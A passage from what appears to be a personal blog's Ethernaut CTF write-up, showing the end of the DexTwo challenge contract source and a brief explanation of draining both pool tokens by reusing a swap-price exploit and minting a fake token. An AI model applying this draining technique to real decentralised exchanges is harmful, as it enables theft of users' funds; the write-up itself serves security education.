</span></span><span class=line><span class=cl>    <span class=nx>SwappableTokenTwo</span><span class=p>(</span><span class=nx>token1</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>spender</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>SwappableTokenTwo</span><span class=p>(</span><span class=nx>token2</span><span class=p>).</span><span class=nx>approve</span><span class=p>(</span><span class=nx>spender</span><span class=p>,</span> <span class=nx>amount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nx>balanceOf</span><span class=p>(</span><span class=nx>address</span> <span class=nx>token</span><span class=p>,</span> <span class=nx>address</span> <span class=nx>account</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>view</span> <span class=nx>returns</span> <span class=p>(</span><span class=nx>uint</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>IERC20</span><span class=p>(</span><span class=nx>token</span><span class=p>).</span><span class=nx>balanceOf</span><span class=p>(</span><span class=nx>account</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>SwappableTokenTwo</span> <span class=nx>is</span> <span class=nx>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>constructor</span><span class=p>(</span><span class=nx>string</span> <span class=nx>memory</span> <span class=nx>name</span><span class=p>,</span> <span class=nx>string</span> <span class=nx>memory</span> <span class=nx>symbol</span><span class=p>,</span> <span class=nx>uint</span> <span class=nx>initialSupply</span><span class=p>)</span> <span class=kr>public</span> <span class=nx>ERC20</span><span class=p>(</span><span class=nx>name</span><span class=p>,</span> <span class=nx>symbol</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>_mint</span><span class=p>(</span><span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>,</span> <span class=nx>initialSupply</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>DexTwo contract is quite similar to Dex contract above. only change is that we can now exchange between any two ERC20 tokens as long as it is present in DexTwo liquidity pool. challenge is to drain both the tokens from the contract. As same get_swap_amount is used, we can use above exploit to drain one of the tokens first and then create our own fake token and repeat the same draining the balance from the remaining token.</p></div><hr><div class="post-navs d-flex mb-3 justify-content-evenly"><div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
<a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></div><div class="post-nav post-next"><a href=https://0x4ka5h.github.io/posts/movectf-2022/>MoveCTF 2022</a>
<i class="fas fa-fw fa-chevron-right"></i></div></div><section class=related-posts-wrapper><h3>Related Posts</h3><ul class=related-posts><li><a href=https://0x4ka5h.github.io/posts/2048withpython/>2048 With Python</a></li><li><a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/invaderctf-writeups/>InvaderCTF Writeups</a></li><li><a href=https://0x4ka5h.github.io/about/>About</a></li><li><a href=https://0x4ka5h.github.io/posts/depthestimationofapothole/>Depth Estimation of a Pothole on Roads</a></li></ul></section></div></article></div></div><aside class="col-lg-4 sidebar d-flex"><div class=container><section class="card row text-center profile component"><div class=card-body><div class="col-12 d-flex align-items-center justify-content-center"><img class="profile-avatar rounded-circle" alt="Akash Thota" src=https://0x4ka5h.github.io/images/me.jpg loading=lazy></div><div class="col-12 profile-meta"><div class=profile-name>Akash Thota</div><div class=profile-bio>Intrested about WEB 3.0 and Block Chain technologies</div><div class=profile-company><i class="fas fa-fw fa-building"></i> ...</div><br><div class=profile-location><i class="fas fa-fw fa-map-marker-alt"></i> India</div><br><div class=profile-about><i class="fas fa-fw fa-user"></i><a href=https://0x4ka5h.github.io/about/> About Me</a></div><br></div></div></section><section class="recent-posts row card component"><div class=card-body><h2 class=card-title>Recent Posts</h2><ul><li><a href=https://0x4ka5h.github.io/posts/movectf-2022/>MoveCTF 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/ethernaut/>The Ethernaut</a></li><li><a href=https://0x4ka5h.github.io/posts/csaw_quals_2022/>CSAW Quals 2022</a></li><li><a href=https://0x4ka5h.github.io/posts/invaderctf-writeups/>InvaderCTF Writeups</a></li><li><a href=https://0x4ka5h.github.io/posts/depthestimationofapothole/>Depth Estimation of a Pothole on Roads</a></li></ul></div></section><section class="taxonomies row card component"><div class=card-body><h2 class=card-title><a href=https://0x4ka5h.github.io/categories>Categories</a></h2><div><a href=https://0x4ka5h.github.io/categories/ctf/ class="badge bg-primary text-white rounded post-taxonomy" title=CTF>CTF
</a><a href=https://0x4ka5h.github.io/categories/security/ class="badge bg-primary text-white rounded post-taxonomy" title=Security>Security
</a><a href=https://0x4ka5h.github.io/categories/gans/ class="badge bg-primary text-white rounded post-taxonomy" title="GAN's">GAN's
</a><a href=https://0x4ka5h.github.io/categories/smart-contract/ class="badge bg-primary text-white rounded post-taxonomy" title="Smart Contract">Smart Contract
</a><a href=https://0x4ka5h.github.io/categories/web3/ class="badge bg-primary text-white rounded post-taxonomy" title=Web3>Web3
</a><a href=https://0x4ka5h.github.io/categories/writeups/ class="badge bg-primary text-white rounded post-taxonomy" title=WriteUps>WriteUps
</a><a href=https://0x4ka5h.github.io/categories/computer-vision/ class="badge bg-primary text-white rounded post-taxonomy" title="Computer Vision">Computer Vision
</a><a href=https://0x4ka5h.github.io/categories/ethernaut/ class="badge bg-primary text-white rounded post-taxonomy" title=Ethernaut>Ethernaut
</a><a href=https://0x4ka5h.github.io/categories/fpga/ class="badge bg-primary text-white rounded post-taxonomy" title=FPGA>FPGA
</a><a href=https://0x4ka5h.github.io/categories/game/ class="badge bg-primary text-white rounded post-taxonomy" title=Game>Game</a></div></div></section><section class="taxonomies row card component"><div class=card-body><h2 class=card-title><a href=https://0x4ka5h.github.io/tags>Tags</a></h2><div><a href=https://0x4ka5h.github.io/tags/image-processing/ class="badge bg-primary text-white rounded post-taxonomy" title="Image Processing">Image Processing
</a><a href=https://0x4ka5h.github.io/tags/deep-learning/ class="badge bg-primary text-white rounded post-taxonomy" title="Deep Learning">Deep Learning
</a><a href=https://0x4ka5h.github.io/tags/machine-learning/ class="badge bg-primary text-white rounded post-taxonomy" title="Machine Learning">Machine Learning
</a><a href=https://0x4ka5h.github.io/tags/misc/ class="badge bg-primary text-white rounded post-taxonomy" title=Misc>Misc
</a><a href=https://0x4ka5h.github.io/tags/crypto/ class="badge bg-primary text-white rounded post-taxonomy" title=Crypto>Crypto
</a><a href=https://0x4ka5h.github.io/tags/de10nano/ class="badge bg-primary text-white rounded post-taxonomy" title=DE10Nano>DE10Nano
</a><a href=https://0x4ka5h.github.io/tags/face-detection/ class="badge bg-primary text-white rounded post-taxonomy" title="Face Detection">Face Detection
</a><a href=https://0x4ka5h.github.io/tags/imageprocessing/ class="badge bg-primary text-white rounded post-taxonomy" title=ImageProcessing>ImageProcessing
</a><a href=https://0x4ka5h.github.io/tags/nodemcu/ class="badge bg-primary text-white rounded post-taxonomy" title=NodeMCU>NodeMCU
</a><a href=https://0x4ka5h.github.io/tags/opencv/ class="badge bg-primary text-white rounded post-taxonomy" title=openCV>openCV</a></div></div></section></div></aside></div></main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"><a class="nav-link social-link" target=_blank href=https://discord.com/invite/0x4ka5h title=Discord rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-discord"></i>
</a><a class="nav-link social-link" href=mailto:0x4ka5h@gmail.com title=Email><i class="fas fa-fw fa-2x fa-envelope"></i>
</a><a class="nav-link social-link" target=_blank href=https://github.com/0x4ka5h title=GitHub rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link" target=_blank href=https://linkedin.com/in/0x4ka5h title=LinkedIn rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-linkedin-in"></i>
</a><a class="nav-link social-link" target=_blank href=https://twitter.com/0x4ka5h title=Twitter rel="noopener noreferrer"><i class="fa-fw fa-2x fab fa-twitter"></i></a></nav><div class="copyright mb-2">Copyright © 2018-2022 Akash Thota. All Rights Reserved.</div></footer><script src=https://0x4ka5h.github.io/js/bundle.min.dfff1fab09c570894e719d1447ee731c8bb5a1e57e18d45beff274823da322f0.js integrity="sha256-3/8fqwnFcIlOcZ0UR+5zHIu1oeV+GNRb7/J0gj2jIvA=" crossorigin=anonymous defer></script><script defer src=https://0x4ka5h.github.io/js/viewer.min.2b366f6cb186c9ce6e41936589e36005bc87d36452602e9aea75f196009e8b95.js integrity="sha256-KzZvbLGGyc5uQZNlieNgBbyH02RSYC6a6nXxlgCei5U=" crossorigin=anonymous></script><script defer src=https://0x4ka5h.github.io/js/katex.min.affcdb0c3de1260e0074ae86bffee9280f85eb73debefdce021e5d030c262a17.js integrity="sha256-r/zbDD3hJg4AdK6Gv/7pKA+F63Pevv3OAh5dAwwmKhc=" crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-213801925-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>